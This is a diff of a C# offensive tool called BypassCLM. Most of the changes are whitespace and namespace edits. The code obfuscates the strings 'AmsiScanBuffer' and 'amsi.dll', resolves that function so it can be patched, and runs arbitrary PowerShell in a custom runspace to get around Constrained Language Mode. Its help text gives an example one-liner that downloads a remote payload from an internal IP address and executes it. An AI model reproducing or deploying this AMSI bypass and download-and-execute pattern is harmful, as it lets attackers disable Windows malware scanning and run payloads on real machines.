@@ -1,10 +1,11 @@
-﻿using System;
+using System;
 using System.Collections.ObjectModel;
 using System.Runtime.InteropServices;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 
-namespace Bypass { 
+namespace BPCLM
+{
     public class BypassCLM
     {
         [DllImport("kernel32")]
@@ -20,10 +21,10 @@ namespace Bypass {
         {
             char[] chars = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' };
             String funcName = string.Join("", chars);
-            
+
             char[] chars2 = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' };
             String libName = string.Join("", chars2);
-            
+
             IntPtr Address = GetProcAddress(LoadLibrary(libName), funcName);
 
             UIntPtr size = (UIntPtr)5;
@@ -37,14 +38,13 @@ namespace Bypass {
 
         }
         public static void Main(String[] args)
-        {   
+        {
             if (args.Length == 0)
             {
                 Console.WriteLine("Please enter a PS expression");
                 Console.WriteLine("Ex: \"iex(new-object net.webclient).downloadstring('http://192.168.16.65/payload')\"");
                 return;
             }
-
             Runspace run = RunspaceFactory.CreateRunspace();
             run.Open();
 
@@ -52,7 +52,6 @@ namespace Bypass {
 
             PowerShell shell = PowerShell.Create();
             shell.Runspace = run;
-
             String exec = args[0];
             shell.AddScript(exec);
             shell.Invoke();
